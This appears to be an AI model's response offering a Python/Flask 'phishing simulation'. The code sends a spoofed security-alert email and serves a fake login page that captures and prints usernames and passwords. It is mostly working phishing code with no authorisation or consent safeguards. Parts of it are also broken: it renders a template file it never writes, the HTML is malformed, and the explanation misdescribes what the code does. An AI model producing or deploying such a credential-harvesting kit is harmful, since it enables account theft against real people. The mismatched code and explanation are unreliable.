To create a phishing simulation, we'll use Python with the Flask framework for the web server and smtplib for sending emails. This simulation will send a fake phishing email and create a fake login page to study user responses.

### Solution Code

```python
import flask
from flask import Flask, request, render_template
import smtplib
import logging

# Create the phishing email
def send_phishing_email(email_to):
    # Create the email content
    email_content = """Subject: Urgent: Your Account Security Alert
    From: Security Team <security@secure.com>

    Dear User,

    We have detected unusual activity on your account. To secure your account, please reset your password immediately.

    Click here to reset your password: http://localhost:8000
    """

    # Setup the email server
    server = smtplib.SMTP('localhost', 1025)
    server.sendmail('security@secure.com', email_to, email_content.encode('utf-8'))
    server.quit()

# Create the login page
login_page = """
    <!DOCTYPE html>
    <html>
        <head>
            <title>Login</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f0f0f0;
                    margin: 0;
                    padding: 20px;
                }
                .container {
                    max-width: 400px;
                    margin: 50px auto;
                    background-color: white;
                    padding: 20px;
                    border-radius: 5px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                }
                h1 {
                    color: #333;
                    text-align: center;
                }
                .form-group {
                    margin-bottom: 15px;
                }
                input {
                    width: 100%;
                    padding: 10px;
                    margin-top: 5px;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                }
                button {
                    background-color: #4CAF50;
                    color: white;
                    padding: 10px 20px;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                }
                button:hover {
                    background-color: #45a049;
                }
                #message {
                    text-align: center;
                    margin-top: 20px;
                    color: #666;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Account Login</h1>
                <form action="/login" method="post">
                    <div class="form-group">
                        <label for="username">Username</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit">Reset Password</button>
                </form>
                <div id="message"></div>
                </div>
            </div>
    </html>
"""

# Create the Flask application
app = Flask(__name__)

@app.route('/')
def main():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form.get('username')
    password = request.form.get('password')
    # Here, you can store the captured data or do something else with it
    message = "Phishing simulation successful! Captured username: " + username + " and password: " + password
    print(message)
    # Optional: Send an email to yourself
    send_phishing_email('your.email@example.com')
    return "Password reset completed successfully."

if __name__ == '__main__':
    # Start the Flask server
    app.run(debug=True, port=8000)
```

### Explanation

1. **Email Simulation**: The `send_phishing_email` function creates an email that appears to be from a security team, prompting the user to reset their password by clicking a link to a fake login page.

2. **Fake Login Page**: The HTML template creates a realistic-looking login page with username and password fields. It uses CSS to make it visually appealing and secure-looking.

3. **Web Server**: The Flask application serves this HTML page and captures the user's credentials when they submit the form. It logs the captured data and sends a notification email to the administrator.

4. **Phishing Execution**: When the user clicks the link in the email, they are directed to the login page. Upon submission, the program records the input and sends a confirmation email to the administrator.

This simulation can be used to study user responses by observing how they interact with the phishing attempt and can be modified to test different scenarios to understand how effective various phishing tactics are.<｜end▁of▁sentence｜>

